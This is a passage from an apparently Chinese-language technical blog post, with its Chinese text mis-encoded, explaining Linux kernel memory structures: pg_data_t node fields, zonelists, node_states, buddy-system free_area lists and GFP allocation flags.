needs to be initialised.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> first_deferred_pfn;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* CONFIG_DEFERRED_STRUCT_PAGE_INIT */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_TRANSPARENT_HUGEPAGE</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">deferred_split</span> <span class="title">deferred_split_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA_BALANCING</span></span><br><span class="line"><span class="comment">/* start time in ms of current promote rate limit period */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> nbp_rl_start;</span><br><span class="line"><span class="comment">/* number of promote candidate pages at start time of current rate limit period */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> nbp_rl_nr_cand;</span><br><span class="line"><span class="comment">/* promote threshold in ms */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> nbp_threshold;</span><br><span class="line"><span class="comment">/* start time in ms of current promote threshold adjustment period */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> nbp_th_start;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * number of promote candidate pages at start time of current promote</span></span><br><span class="line"><span class="comment"> * threshold adjustment period</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> nbp_th_nr_cand;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/* Fields commonly accessed by the page reclaim scanner */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * <span class="doctag">NOTE:</span> THIS IS UNUSED IF MEMCG IS ENABLED.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Use mem_cgroup_lruvec() to look up lruvecs.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lruvec</span>__<span class="title">lruvec</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>flags;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_LRU_GEN</span></span><br><span class="line"><span class="comment">/* kswap mm walk data */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lru_gen_mm_walk</span> <span class="title">mm_walk</span>;</span></span><br><span class="line"><span class="comment">/* lru_gen_folio list */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lru_gen_memcg</span> <span class="title">memcg_lru</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">CACHELINE_PADDING(_pad2_);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Per-node vmstats */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_nodestat</span> __<span class="title">percpu</span> *<span class="title">per_cpu_nodestats</span>;</span></span><br><span class="line"><span class="keyword">atomic_long_t</span>vm_stat[NR_VM_NODE_STAT_ITEMS];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">memory_tier</span> __<span class="title">rcu</span> *<span class="title">memtier</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMORY_FAILURE</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">memory_failure_stats</span> <span class="title">mf_stats</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125; <span class="keyword">pg_data_t</span>;</span><br></pre></td></tr></table></figure><h3 id="æˆå‘˜æè¿°"><a href="#æˆå‘˜æè¿°" class="headerlink" title="æˆå‘˜æè¿°"></a>æˆå‘˜æè¿°</h3><ul><li>  <strong>node_zones</strong>: node çš„ zone åˆ—è¡¨ï¼ŒèŠ‚ç‚¹ä¸­æœ€é‡è¦çš„å­—æ®µ <code>node_zones</code> ä½œä¸ºä¸€ä¸ª zone ç»“æ„ä½“æ•°ç»„ è®°å½•äº†æœ¬èŠ‚ç‚¹ä¸Šæ‰€æœ‰çš„ zoneï¼Œå…¶ä¸­æœ‰æ•ˆçš„ zone çš„ä¸ªæ•°ç”±èŠ‚ç‚¹ç»“æ„ä½“çš„ <code>nr_zones</code> å­—æ®µæŒ‡å‡ºã€‚</li><li>  <strong>node_zonelists</strong>: å†…å­˜åˆ†é…æ—¶å¤‡ç”¨ zone çš„æœç´¢é¡ºåºï¼Œè¯¥å­—æ®µç”¨ä»¥ç¡®å®šå†…å­˜åˆ†é…æ—¶å¯¹å¤‡ç”¨çš„ zone çš„æœç´¢é¡ºåºï¼Œåœ¨æœ¬èŠ‚ç‚¹å¸¸è§„å†…å­˜åˆ†é…å¤±è´¥æ—¶ä¼šæ²¿ç€è¿™ä¸ªæ•°ç»„è¿›è¡Œæœç´¢ï¼Œå…¶ä¸­åŒ…å«çš„ zone å¯ä»¥æ˜¯éæœ¬èŠ‚ç‚¹çš„ zoneã€‚</li></ul><p>å…¶ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>;</span><span class="comment">/* Pointer to actual zone */</span></span><br><span class="line"><span class="keyword">int</span> zone_idx;<span class="comment">/* zone_idx(zoneref-&gt;zone) */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zonelist</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> _<span class="title">zonerefs</span>[<span class="title">MAX_ZONES_PER_ZONELIST</span> + 1];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>  <strong>node_start_pfn</strong>: node çš„èµ·å§‹é¡µæ¡†æ ‡å·ï¼Œè¯¥å­—æ®µè®°å½•äº†è¯¥èŠ‚ç‚¹ä¸Šçš„ç‰©ç†å†…å­˜èµ·å§‹é¡µæ¡†æ ‡å·ã€‚</li><li>  <strong>node_present_pages</strong>: nodeä¸­ç‰©ç†é¡µçš„æ€»æ•°é‡ã€‚</li><li>  <strong>node_spanned_pages</strong>: è¯¥å­—æ®µè®°å½•äº†èŠ‚ç‚¹ä¸ŠåŒ…æ‹¬ç©ºæ´åœ¨å†…çš„é¡µå¸§ä¸ºå•ä½çš„è¯¥èŠ‚ç‚¹å†…å­˜çš„æ€»é•¿åº¦ã€‚</li><li>  <strong>node_id</strong>: è¯¥å­—æ®µè®°å½•äº†è¯¥èŠ‚ç‚¹åœ¨ç³»ç»Ÿä¸­çš„æ ‡å·ï¼Œä» 0 å¼€å§‹ã€‚</li></ul><h3 id="nodeå­˜å‚¨æ–¹å¼"><a href="#nodeå­˜å‚¨æ–¹å¼" class="headerlink" title="nodeå­˜å‚¨æ–¹å¼"></a>nodeå­˜å‚¨æ–¹å¼</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span> *<span class="title">node_data</span>[<span class="title">MAX_NUMNODES</span>] __<span class="title">read_mostly</span>;</span></span><br><span class="line">EXPORT_SYMBOL(node_data);</span><br></pre></td></tr></table></figure><p>åœ¨å†…æ ¸ä¸­å®šä¸€ä¸ªåä¸º<code>node_data</code>çš„<code>pglist_data</code>æ•°ç»„ï¼Œè¯¥æ•°ç»„ä¿å­˜ç€ç³»ç»Ÿä¸­çš„æ‰€æœ‰èŠ‚ç‚¹ã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/KcHILforOySi8YR.png"                                     ></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">âœ  ~ numactl --hardware</span><br><span class="line">available: 1 nodes (0)</span><br><span class="line">node 0 cpus: 0 1</span><br><span class="line">node 0 size: 3904 MB</span><br><span class="line">node 0 free: 313 MB</span><br><span class="line">node distances:</span><br><span class="line">node   0 </span><br><span class="line">  0:  10 </span><br><span class="line">âœ  ~ </span><br></pre></td></tr></table></figure><p>åœ¨Linuxä¸­å¯ä»¥ç”¨ä¸Šè¿°å‘½ä»¤æŸ¥çœ‹å­˜åœ¨å¤šå°‘nodeã€‚</p><h3 id="nodeçŠ¶æ€"><a href="#nodeçŠ¶æ€" class="headerlink" title="nodeçŠ¶æ€"></a>nodeçŠ¶æ€</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">nodemask_t</span> node_states[NR_NODE_STATES] __read_mostly = &#123;</span><br><span class="line">[N_POSSIBLE] = NODE_MASK_ALL,</span><br><span class="line">[N_ONLINE] = &#123; &#123; [<span class="number">0</span>] = <span class="number">1UL</span> &#125; &#125;,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_NUMA</span></span><br><span class="line">[N_NORMAL_MEMORY] = &#123; &#123; [<span class="number">0</span>] = <span class="number">1UL</span> &#125; &#125;,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_HIGHMEM</span></span><br><span class="line">[N_HIGH_MEMORY] = &#123; &#123; [<span class="number">0</span>] = <span class="number">1UL</span> &#125; &#125;,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">[N_MEMORY] = &#123; &#123; [<span class="number">0</span>] = <span class="number">1UL</span> &#125; &#125;,</span><br><span class="line">[N_CPU] = &#123; &#123; [<span class="number">0</span>] = <span class="number">1UL</span> &#125; &#125;,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span><span class="comment">/* NUMA */</span></span></span><br><span class="line">&#125;;</span><br><span class="line">EXPORT_SYMBOL(node_states);</span><br></pre></td></tr></table></figure><p>åœ¨Linuxä¸­å­˜åœ¨ä¸Šé¢è¿™æ ·ä¸€ä¸ªå…¨å±€æ•°ç»„ç”¨ä»¥è¡¨ç¤ºæ ‡è¯†å¯¹åº”æ ‡å·çš„èŠ‚ç‚¹çŠ¶æ€ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span> DECLARE_BITMAP(bits, MAX_NUMNODES); &#125; <span class="keyword">nodemask_t</span>;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ<code>nodemask_t</code>æ˜¯ä¸€ä¸ªä½å›¾ç±»å‹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">node_states</span> &#123;</span></span><br><span class="line">N_POSSIBLE,<span class="comment">/* The node could become online at some point */</span></span><br><span class="line">N_ONLINE,<span class="comment">/* The node is online */</span></span><br><span class="line">N_NORMAL_MEMORY,<span class="comment">/* The node has regular memory */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_HIGHMEM</span></span><br><span class="line">N_HIGH_MEMORY,<span class="comment">/* The node has regular or high memory */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">N_HIGH_MEMORY = N_NORMAL_MEMORY,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">N_MEMORY,<span class="comment">/* The node has memory(regular, high, movable) */</span></span><br><span class="line">N_CPU,<span class="comment">/* The node has one or more cpus */</span></span><br><span class="line">N_GENERIC_INITIATOR,<span class="comment">/* The node has one or more Generic Initiators */</span></span><br><span class="line">NR_NODE_STATES</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªçŠ¶æ€ç”±ä¸€ä¸ªæšä¸¾ç±»å‹ <code>node_states</code> å®šä¹‰ã€‚</p><h2 id="buddy-systemä¸­çš„å†…å­˜ç»„ç»‡å½¢å¼"><a href="#buddy-systemä¸­çš„å†…å­˜ç»„ç»‡å½¢å¼" class="headerlink" title="buddy systemä¸­çš„å†…å­˜ç»„ç»‡å½¢å¼"></a>buddy systemä¸­çš„å†…å­˜ç»„ç»‡å½¢å¼</h2><p>åœ¨ä¸Šé¢ç®€å•æåˆ°äº†è¿™ä¸€zoneä¸­çš„æˆå‘˜ï¼Œå…¶ä½œç”¨ä¸»è¦ç”¨äºå­˜å‚¨<code>buddy system</code>æŒ‰ç…§orderç®¡ç†çš„é¡µé¢ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> &#123;</span></span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_area</span><span class="title">free_area</span>[<span class="title">MAX_ORDER</span> + 1];</span></span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">&#125; ____cacheline_internodealigned_in_smp;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„<code>MAX_ORDER</code>çš„å€¼ä¸º10æ‰€ä»¥å…¶æ•°ç»„å®šä¹‰ä¸º11ã€‚</p><p>åœ¨<code>buddy system</code>ä¸­æŒ‰ç…§ç©ºé—²é¡µé¢çš„è¿ç»­å¤§å°è¿›è¡Œåˆ†é˜¶ç®¡ç†ï¼Œè¿™é‡Œçš„ order çš„å®é™…å«ä¹‰ä¸ºè¿ç»­çš„ç©ºé—²é¡µé¢çš„å¤§å°ï¼Œä¸è¿‡å•ä½ä¸æ˜¯é¡µé¢æ•°ï¼Œè€Œæ˜¯ä»‹ï¼Œå³å¯¹äºæ¯ä¸ªä¸‹æ ‡è€Œè¨€ï¼Œå…¶ä¸­æ‰€å­˜å‚¨çš„é¡µé¢å¤§å°ä¸ºï¼š<code>2^order</code>ã€‚</p><p>åœ¨<code>free_area</code>ä¸­å­˜æ”¾çš„é¡µé¢é€šè¿‡è‡ªèº«ç›¸åº”å­—æ®µè¿æ¥æˆåŒå‘é“¾è¡¨ç»“æ„ï¼Œåœ¨å‰æ–‡ä¸­æœ‰è¯¦ç»†ä»‹ç»ã€‚è¿™é‡Œç®€å•è¯´ä¸€ä¸‹<code>free_area</code>ç»“æ„ä½“ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_area</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">free_list</span>[<span class="title">MIGRATE_TYPES</span>];</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>nr_free;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„<code>nr_free</code>æˆå‘˜å¾ˆæ˜æ˜¾å°±æ˜¯ç”¨äºè®°å½•äº†åœ¨å½“å‰<code>free_area</code>ä¸­çš„ç©ºé—²é¡µé¢å—çš„æ•°é‡ï¼Œå¯¹äº<code>free_area[0]</code>ä»¥å¤–çš„<code>free_area</code>è€Œè¨€å…¶å•ä½å¹¶éæ˜¯å•ä¸ªé¡µæ¡†ï¼Œè€Œæ˜¯ä»¥å†…å­˜å—ä¸ºå•ä½ã€‚</p><p>è€Œ<code>free_list</code>æˆå‘˜åˆ™æ˜¯ä¸º<code>list_head</code>çš„é“¾è¡¨ç»“æ„å…¶é€šè¿‡pageç»“æ„ä½“çš„<code>lru</code>å­—æ®µå°†pageç»“æ„ä½“è¿æ¥æˆåŒå‘é“¾è¡¨ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lru</span>;</span></span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line">&#125; _struct_page_alignment;</span><br></pre></td></tr></table></figure><p>page ç»“æ„ä½“ä¸­çš„ <code>lru</code> è¿™ä¸€å­—æ®µçš„ç±»å‹ä¸º <code>struct list_head</code>ï¼Œè¿™æ˜¯å†…æ ¸ç¼–ç¨‹ä¸­é€šç”¨çš„åŒå‘é“¾è¡¨ç»“æ„ï¼Œ<code>free_list</code>ä¸<code>lru</code>é“¾è¡¨éƒ½ä½¿ç”¨è¯¥å­—æ®µå°†é¡µç»“æ„ä½“ç»„ç»‡ä¸ºåŒå‘é“¾è¡¨ï¼Œå³ä¸€ä¸ªé¡µæ˜¯ä¸å¯èƒ½åŒæ—¶å‡ºç°åœ¨<code>lru</code>é“¾è¡¨ä¸<code>buddy system</code>ä¸­çš„ã€‚</p><p>å¹¶ä¸”å¯ä»¥æ˜ç¡®çœ‹åˆ°è¿™é‡Œæ˜¯æŒ‰ç…§è¿ç§»ç±»å‹è¿›è¡Œåˆ†ç±»çš„ï¼Œå…·ä½“å‰é¢æåˆ°è¿‡è¿™é‡Œä¸è¯¦ç»†å†™äº†ã€‚</p><h2 id="buddy-systemé¡µåˆ†é…"><a href="#buddy-systemé¡µåˆ†é…" class="headerlink" title="buddy systemé¡µåˆ†é…"></a>buddy systemé¡µåˆ†é…</h2><h3 id="GFP-get-free-page-æ ‡è¯†ä½"><a href="#GFP-get-free-page-æ ‡è¯†ä½" class="headerlink" title="GFP (get free page) æ ‡è¯†ä½"></a>GFP (get free page) æ ‡è¯†ä½</h3><p>åœ¨ kernel memory allocation ä¸­æˆ‘ä»¬ç»å¸¸èƒ½è§åˆ° <code>gfp_t</code> ç±»å‹ï¼Œå…¶è¡¨ç¤ºåˆ†é…æ—¶çš„æ ‡å¿—ä½ã€‚</p><ul><li>  å†…å­˜ç®¡ç†åŒºä¿®é¥°ç¬¦: å†…å­˜ç®¡ç†åŒºä¿®é¥°ç¬¦ä¸»è¦æè¿°ä»å“ªäº›å†…å­˜ç®¡ç†åŒºæ¥åˆ†é…å†…å­˜</li></ul><table><thead><tr><th>flag</th><th>description</th></tr></thead><tbody><tr><td>__GFP_DMA</td><td>ä»ZONE_DMAåŒºä¸­åˆ†é…å†…å­˜</td></tr><tr><td>__GFP_HIGNMEM</td><td>ä»ZONE_HIGHMEMåŒºä¸­åˆ†é…å†…å­˜</td></tr><tr><td>__GFP_DMA32</td><td>ä»ZONE_DMA32åŒºä¸­åˆ†é…å†…å­˜</td></tr><tr><td>__GFP_MOVABLE</td><td>å†…å­˜è§„æ•´æ—¶å¯ä»¥è¿ç§»æˆ–å›æ”¶é¡µé¢</td></tr></tbody></table><ul><li>  ç§»åŠ¨å’Œæ›¿æ¢ä¿®é¥°ç¬¦: ç§»åŠ¨å’Œæ›¿æ¢ä¿®é¥°ç¬¦ä¸»è¦è¡¨ç¤ºåˆ†é…å‡ºæ¥çš„é¡µé¢å…·æœ‰çš„è¿ç§»å±æ€§</li></ul><table><thead><tr><th>flag</th><th>description</th></tr></thead><tbody><tr><td>__GFP_RECLAIMABLE</td><td>åˆ†é…çš„å†…å­˜é¡µé¢å¯ä»¥å›æ”¶</td></tr><tr><td>__GFP_WRITE</td><td>ç”³è¯·çš„é¡µé¢ä¼šè¢«å¼„æˆè„é¡µ</td></tr><tr><td>__GFP_HARDWALL</td><td>å¼ºåˆ¶ä½¿ç”¨cpusetå†…å­˜åˆ†é…ç­–ç•¥</td></tr><tr><td>__GFP_THISNODE</td><td>åœ¨æŒ‡å®šçš„èŠ‚ç‚¹ä¸Šåˆ†é…å†…å­˜</td></tr><tr><td>__GFP_ACCOUNT</td><td>kmemcgä¼šè®°å½•åˆ†é…è¿‡ç¨‹</td></tr></tbody></table><ul><li>  æ°´ä½ä¿®é¥°ç¬¦: ä¸æ°´ä½çº¿ç›¸å…³çš„æ ‡å¿—ä½</li></ul><table><thead><tr><th>flag</th><th>description</th></tr></thead><tbody><tr><td>__GFP_ATOMIC</td><td>é«˜ä¼˜å…ˆçº§åˆ†é…å†…å­˜ï¼Œåˆ†é…å™¨å¯ä»¥åˆ†é…æœ€ä½è­¦æˆ’æ°´ä½çº¿ä¸‹çš„é¢„ç•™å†…å­˜</td></tr><tr><td>__GFP_HIGH</td><td>åˆ†é…å†…å­˜çš„è¿‡ç¨‹ä¸­ä¸å¯ä»¥ç¡çœ æˆ–æ‰§è¡Œé¡µé¢å›æ”¶åŠ¨ä½œ</td></tr><tr><td>__GFP_MEMALLOC</td><td>å…è®¸è®¿é—®æ‰€æœ‰çš„å†…å­˜</td></tr><tr><td>__GFP_NOMEMALLOC</td><td>ä¸å…è®¸è®¿é—®æœ€ä½è­¦æˆ’æ°´ä½çº¿ä¸‹çš„ç³»ç»Ÿé¢„ç•™å†…å­˜</td></tr></tbody></table><ul><li>  é¡µé¢å›æ”¶ä¿®é¥°ç¬¦: ä¸é¡µé¢å›æ”¶ç›¸å…³çš„æ ‡å¿—ä½</li></ul><table><thead><tr><th>flag</th><th>description</th></tr></thead><tbody><tr><td>__GFP_IO</td><td>å¯åŠ¨ç‰©ç†I/Oä¼ è¾“</td></tr><tr><td>__GFP_FS</td><td>å…è®¸è°ƒç”¨åº•å±‚FSæ–‡ä»¶ç³»ç»Ÿã€‚å¯é¿å…åˆ†é…å™¨é€’å½’åˆ°å¯èƒ½å·²ç»æŒæœ‰é”çš„æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œ é¿å…æ­»é”</td></tr><tr><td>__GFP_DIRECT_RECLAIM</td><td>åˆ†é…å†…å­˜è¿‡ç¨‹ä¸­å¯ä»¥ä½¿ç”¨ç›´æ¥å†…å­˜å›æ”¶</td></tr><tr><td>__GFP_KSWAPD_RECLAIM</td><td>å†…å­˜åˆ°è¾¾ä½æ°´ä½æ—¶å”¤é†’kswapdçº¿ç¨‹å¼‚æ­¥å›æ”¶å†…å­˜</td></tr><tr><td>__GFP_RECLAIM</td><td>è¡¨ç¤ºæ˜¯å¦å¯ä»¥ç›´æ¥å†…å­˜å›æ”¶æˆ–è€…ä½¿ç”¨kswapdçº¿ç¨‹è¿›è¡Œå›æ”¶</td></tr><tr><td>__GFP_RETRY_MAYFAIL</td><td>åˆ†é…å†…å­˜å¯ä»¥å¯èƒ½ä¼šå¤±è´¥ï¼Œä½†æ˜¯åœ¨ç”³è¯·è¿‡ç¨‹ä¸­ä¼šå›æ”¶ä¸€äº›ä¸å¿…è¦çš„å†…å­˜ï¼Œæ˜¯æ•´ä¸ªç³»ç»Ÿå—ç›Š</td></tr><tr><td>__GFP_NOFAIL</td><td>å†…å­˜åˆ†é…å¤±è´¥åæ— é™åˆ¶çš„é‡å¤å°è¯•ï¼ŒçŸ¥é“åˆ†é…æˆåŠŸ</td></tr><tr><td>__GFP_NORETRY</td><td>ç›´æ¥é¡µé¢å›æ”¶æˆ–è€…å†…å­˜è§„æ•´åè¿˜æ˜¯æ— æ³•åˆ†é…å†…å­˜æ—¶ï¼Œä¸å¯ç”¨retryåå¤å°è¯•åˆ†é…å†…å­˜ï¼Œç›´æ¥è¿”å›NULL</td></tr></tbody></table><ul><li>  è¡Œä¸ºä¿®é¥°ç¬¦: ä¸åˆ†é…æ—¶çš„è¡Œä¸ºç›¸å…³çš„æ ‡å¿—ä½</li></ul><table><thead><tr><th>flag</th><th>description</th></tr></thead><tbody><tr><td>__GFP_NOWARN</td><td>å…³é—­å†…å­˜åˆ†é…è¿‡ç¨‹ä¸­çš„WARNING</td></tr><tr><td>__GFP_COMP</td><td>åˆ†é…çš„å†…å­˜é¡µé¢å°†è¢«ç»„åˆæˆå¤åˆé¡µcompound page</td></tr><tr><td>__GFP_ZERO</td><td>è¿”å›ä¸€ä¸ªå…¨éƒ¨å¡«å……ä¸º0çš„é¡µé¢</td></tr></tbody></table><ul><li>  ç»„åˆç±»å‹æ ‡å¿—: å‰é¢æè¿°çš„ä¿®é¥°ç¬¦ç§è¿‡äºç¹å¤šï¼Œå› æ­¤linuxå®šä¹‰äº†ä¸€äº›ç»„åˆçš„ç±»å‹æ ‡å¿—ï¼Œä¾›å¼€å‘è€…ä½¿ç”¨</li></ul><table><thead><tr><th>flag</th><th>element</th><th>description</th></tr></thead><tbody><tr><td>GFP_ATOMIC</td><td>__GFP_HIGH|__GFP_ATOMIC|__GFP_KSWAPD_RECLAIM</td><td>åˆ†é…è¿‡ç¨‹ä¸èƒ½ä¼‘çœ ï¼Œåˆ†é…å…·æœ‰é«˜ä¼˜å…ˆçº§ï¼Œå¯ä»¥è®¿é—®ç³»ç»Ÿé¢„ç•™å†…å­˜</td></tr><tr><td>GFP_KERNEL</td><td>__GFP_RECLAIM|__GFP_IO|__GFP_FS</td><td>åˆ†é…å†…å­˜æ—¶å¯ä»¥è¢«é˜»å¡(å³ä¼‘çœ )</td></tr><tr><td>GFP_KERNEL_ACCOUNT</td><td>GFP_KERNEL|__GFP_ACCOUNT</td><td>å’ŒGFP_KERNELä½œç”¨ä¸€æ ·ï¼Œä½†æ˜¯åˆ†é…çš„è¿‡ç¨‹ä¼šè¢«kmemcgè®°å½•</td></tr><tr><td>GFP_NOWAIT</td><td>__GFP_KSWAPD_RECLAIM</td><td>åˆ†é…è¿‡ç¨‹ä¸­ä¸å…è®¸å› ç›´æ¥å†…å­˜å›æ”¶è€Œå¯¼è‡´åœé¡¿</td></tr><tr><td>GFP_NOIO</td><td>__GFP_RECLAIM</td><td>ä¸éœ€è¦å¯åŠ¨ä»»ä½•çš„I/Oæ“ä½œ</td></tr><tr><td>GFP_NOFS</td><td>__GFP_RECLAIM |__GFP_IO</td><td>ä¸ä¼šæœ‰è®¿é—®ä»»ä½•æ–‡ä»¶ç³»ç»Ÿçš„æ“ä½œ</td></tr><tr><td>GFP_USER</td><td>__GFP_RECLAIM|__GFP_IO|__GFP_FS|__GFP_HARDWALL</td><td>ç”¨æˆ·ç©ºé—´çš„è¿›ç¨‹åˆ†é…å†…å­˜</td></tr><tr><td>GFP_DMA</td><td>__GFP_DMA</td><td>ä»ZONE_DMAåŒºåˆ†é…å†…å­˜</td></tr><tr><td>GFP_DMA32</td><td>__GFP_DMA32</td><td>ä»ZONE_DMA32åŒºåˆ†é…å†…å­˜</td></tr><tr><td>GFP_HIGHUSER</td><td>GFP_USER|__GFP_HIGHMEM</td><td>ç”¨æˆ·è¿›ç¨‹åˆ†é…å†…å­˜ï¼Œä¼˜å…ˆä½¿ç”¨ZONE_HIGHMEMï¼Œ ä¸”è¿™äº›é¡µé¢ä¸å…è®¸è¿ç§»</td></tr><tr><td>GFP_HIGHUSER_MOVABLE</td><td>GFP_HIGHUSER|__GFP_MOVABLE</td><td>å’ŒGFP_HIGHUSERç±»ä¼¼ï¼Œä½†æ˜¯é¡µé¢å¯ä»¥è¿ç§»</td></tr><tr><td>GFP_TRANSHUGE_LIGHT</td><td>(GFP_HIGHUSER_MOVABLE|__GFP_COMP|__GFP_NOMEMALLOC|__GFP_NOWARN)&amp; ~__GFP_RECLAIM</td><td>é€æ˜å¤§é¡µçš„å†…å­˜åˆ†é…ï¼Œ lightè¡¨ç¤ºä¸è¿›è¡Œå†…å­˜å‹ç¼©å’Œå›æ”¶</td></tr><tr><td>GFP_TRANSHUGE</td><td>GFP_TRANSHUGE_LIGHT|__GFP_DIRECT_RECLAIM</td><td>å’ŒGFP_TRANSHUGE_LIGHTç±»ä¼¼ï¼Œé€šå¸¸khugepagedä½¿ç”¨è¯¥æ ‡å¿—</td></tr></tbody></table><h2 